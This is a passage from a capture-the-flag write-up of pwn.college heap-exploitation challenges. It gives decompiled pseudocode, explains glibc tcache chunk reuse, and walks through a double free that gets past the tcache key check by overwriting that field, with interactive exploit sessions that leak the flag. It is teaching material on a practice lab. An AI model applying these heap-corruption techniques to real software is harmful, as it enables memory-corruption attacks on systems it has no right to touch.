[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Easy)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c4b0
[*] read the flag!
```

### Binary analysis

```c title="/challenge/free-flag-fumble-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+24h] [rbp-12Ch]
  unsigned int v6; // [rsp+28h] [rbp-128h]
  unsigned int v7; // [rsp+28h] [rbp-128h]
  unsigned int v8; // [rsp+28h] [rbp-128h]
  unsigned int size; // [rsp+2Ch] [rbp-124h]
  void *size_4; // [rsp+30h] [rbp-120h]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  printf("In this challenge, the flag buffer is allocated %d times before it is used.\n\n", 2);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_TCACHE(main_thread_TCACHE);
          puts(byte_246E);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          v6 = atoi(s1);
          if ( v6 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0xE0u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_246E);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
          ptr[v6] = malloc(size);
          printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_246E);
        v7 = atoi(s1);
        if ( v7 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0xF2u, "main");
        printf("[*] free(allocations[%d])\n", v7);
        free(ptr[v7]);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_246E);
      v8 = atoi(s1);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0xFFu, "main");
      printf("[*] puts(allocations[%d])\n", v8);
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", 480);
      size_4 = malloc(0x1E0u);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80u);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This time the `read_flag` function reads the flag twice into buffers of size `480` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c4b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 480

[*] allocations[0] = malloc(480)
[*] allocations[0] = 0x562a9e54c6a0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 480

[*] allocations[1] = malloc(480)
[*] allocations[1] = 0x562a9e54c890

[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 1     | HEAD: 0x562a9e54c6a0       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 2     | HEAD: 0x562a9e54c890       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c890      | 0                   | 0x1f1 (P)                    | 0x562a9e54c6a0      | 0x562a9e54c010      |
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c890
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c6a0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

[*] puts(allocations[0])
Data: pwn.college{4d96a3J7Ce0XBHbjqikTX4-jo2e.0VN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Hard)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:/$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag
```

As always, the hard challenge does not tell us the size of the buffers into which the flag was read.

### Binary Analysis

```c title="/challenge/free-flag-fumble-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+24h] [rbp-12Ch]
  unsigned int index_1; // [rsp+28h] [rbp-128h]
  unsigned int index; // [rsp+28h] [rbp-128h]
  unsigned int v8; // [rsp+28h] [rbp-128h]
  unsigned int size; // [rsp+2Ch] [rbp-124h]
  void *size_4; // [rsp+30h] [rbp-120h]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_2020);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          if ( strcmp(choice, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          index_1 = atoi(choice);
          if ( index_1 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 60u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          size = atoi(choice);
          ptr[index_1] = malloc(size);
        }
        if ( strcmp(choice, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2020);
        index = atoi(choice);
        if ( index > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 76u, "main");
        free(ptr[index]);
      }
      if ( strcmp(choice, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_2020);
      v8 = atoi(choice);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 88u, "main");
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(choice, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
      size_4 = malloc(957uLL);
    v3 = open("/flag", 0);
    read(v3, size_4, 128uLL);
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

We can see that on making the `read_flag` choice, the program allocates two buffers of size `957` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:~$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

Data: pwn.college{8Wq-xUWLolH-kpTT9mLLl4qgFmM.0lN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Fickle Free (Easy)

```
hacker@dynamic-allocator-misuse~fickle-free-easy:~$ /challenge/fickle-free-easy 
###
### Welcome to /challenge/fickle-free-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/scanf/read_flag/quit): 
```

### Binary analysis

```c title="/challenge/fickle-free-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v12; // [rsp+D8h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = nullptr;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 1);
  printf("In this challenge, the flag buffer is allocated %d times before it is used.\n\n", 2);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_246E);
            printf("[*] Function (malloc/free/puts/scanf/read_flag/quit): ");
            __isoc99_scanf("%127s", s1);
            puts(byte_246E);
            if ( strcmp(s1, "malloc") )
              break;
            printf("Size: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_246E);
            size = atoi(s1);
            printf("[*] allocations[%d] = malloc(%d)\n", 0, size);
            ptr = malloc(size);
            printf("[*] allocations[%d] = %p\n", 0, ptr);
          }
          if ( strcmp(s1, "free") )
            break;
          printf("[*] free(allocations[%d])\n", 0);
          free(ptr);
        }
        if ( strcmp(s1, "puts") )
          break;
        printf("[*] puts(allocations[%d])\n", 0);
        printf("Data: ");
        puts((const char *)ptr);
      }
      if ( strcmp(s1, "scanf") )
        break;
      v3 = malloc_usable_size(ptr);
      sprintf(s1, "%%%us", v3);
      v4 = malloc_usable_size(ptr);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, 0);
      __isoc99_scanf(s1, ptr);
      puts(byte_246E);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", 784);
      size_4 = malloc(0x310u);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v5 = open("/flag", 0);
    read(v5, size_4, 0x80u);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

In this challege we have to leverage Double Free vulnerability.

### Double free

In the allocated memory chunks, the second set of 8 bytes include the pointer `key` to `TCACHE_perthread_struct`. Once a chunk is allocated, the `key` pointer no longer points to `TCACHE_perthread_struct` and is set to `NULL`. This state of the `key` is what helps Tcache distinguish free chunks from allocated ones.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)

a = malloc(16)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 1    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &B   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
                         │
                         │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
┆  TCACHE_entry A  ┆     │
├──────────────────┤     │
│  ..............  │     │
├──────────────────┤     │
│       NULL       │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `TCACHE_perthread_struct` for the current thread.

If `key == TCACHE_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (TCACHE)" error.

If `key != TCACHE_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)

a = malloc(16)

free(a)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

By overwriting the `key` with a dummy value (or `NULL`), we can "trick" the allocator into thinking the chunk is not currently in the Tcache. This allows us to call `free()` a second time on the same chunk without triggering the security crash.

### Exploit

```
hacker@dynamic-allocator-misuse~fickle-free-easy:~$ /challenge/fickle-free-easy 
###
### Welcome to /challenge/fickle-free-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc   

Size: 784

[*] allocations[0] = malloc(784)
[*] allocations[0] = 0x5dbbb3dcb2c0

[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | (nil)               | 0x5dbbb3dcb010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

[*] scanf("%792s", allocations[0])
AAAAAAAAA

+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x4141414141414141  | 0x5dbbb3dc0041      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 2     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag

[*] flag_buffer = malloc(784)
[*] flag_buffer = 0x5dbbb3dcb2c0
[*] flag_buffer = malloc(784)
[*] flag_buffer = 0x5dbbb3dcb2c0
[*] read the flag!

[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{Mbk_-TzLM_emeeQEjY3XeOkWk_p.01N3MDL4ITM0EzW}


[*] Function (malloc/free/puts/scanf/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Fickle Free (Hard)

This time we need to find the size of the buffer into which the flag is read.

### Binary Analysis

```c title="/challenge/fickle-free-hard :: main() :: Pseudocode" showLineNumbers 
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char choice[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]

  v11 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = 0LL;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_2020);
            printf("[*] Function (malloc/free/puts/scanf/read_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            size = atoi(choice);
            ptr = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          free(ptr);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Data: ");
        puts((const char *)ptr);
      }
      if ( strcmp(choice, "scanf") )
        break;
      v3 = malloc_usable_size(ptr);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr);
      puts(byte_2020);
    }
    if ( strcmp(choice, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
      size_4 = malloc(328uLL);
    v4 = open("/flag", 0);
    read(v4, size_4, 128uLL);
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

- [x] Size of the memory allocation into which the flag is read: `328`

### Exploit

```
hacker@dynamic-allocator-misuse~fickle-free-hard:~$ /challenge/fickle-free-hard 
###
### Welcome to /challenge/fickle-free-hard!
###


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc

Size: 328


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

AAAAAAAAA


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag


[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

Data: pwn.college{Amc7hATLzmOx9D_YV-iznVKLvb-.0FO3MDL4ITM0EzW}


[*] Function (malloc/free/puts/scanf/read_flag/quit): quit    

### Goodbye!
```

&nbsp;

## Malloc Mirage (Easy)

```
hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
###
### Welcome to /challenge/malloc-mirage-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag

[*] flag_buffer = malloc(896)
[*] flag_buffer = 0x6293f46682c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
```

Let's see what the program does by decompiling the binary.

### Binary Analysis

```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+24h] [rbp-13Ch]
  unsigned int v6; // [rsp+28h] [rbp-138h]
  unsigned int v7; // [rsp+28h] [rbp-138h]
  unsigned int v8; // [rsp+28h] [rbp-138h]
  unsigned int size; // [rsp+2Ch] [rbp-134h]
  const char *size_4; // [rsp+30h] [rbp-130h]
  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-18h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_2419);
            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 228u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
            ptr[v6] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2419);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 246u, "main");
          printf("[*] free(allocations[%d])\n", v7);
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2419);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 259u, "main");
        printf("[*] puts(allocations[%d])\n", v8);
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
        size_4 = (const char *)malloc(896uLL);
        *(_QWORD *)size_4 = 0LL;
        printf("[*] flag_buffer = %p\n", size_4);
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
      puts("[*] read the flag!");
    }
    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

So if we pass the `read_flag` command, the program zeroes out the first 8 bytes represented by `size_4` of that allocation. The flag is then read 16 bytes after `size_4`.

```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
        size_4 = (const char *)malloc(896uLL);
        *(_QWORD *)size_4 = 0LL;
        printf("[*] flag_buffer = %p\n", size_4);
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
      puts("[*] read the flag!");

# ---- snip ----      
```

Then, if we pass `puts_flag`, it checks if the `size_4` is zeroed out. If it is, the flag is not printed.

```c title="/challenge/malloc-mirage-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");

# ---- snip ----
```

### Tcache chunk chaining

When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `TCACHE_perthread_struct` for the current thread.

If `key == TCACHE_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (TCACHE)" error.

If `key != TCACHE_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache by setting that chunk's `key` pointer to the `TCACHE_perthread_struct` for the current thread. It also adds that chunk to the beginning of the singly-linked list by setting the chunks `next` pointer to the address of the previously first chunk.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
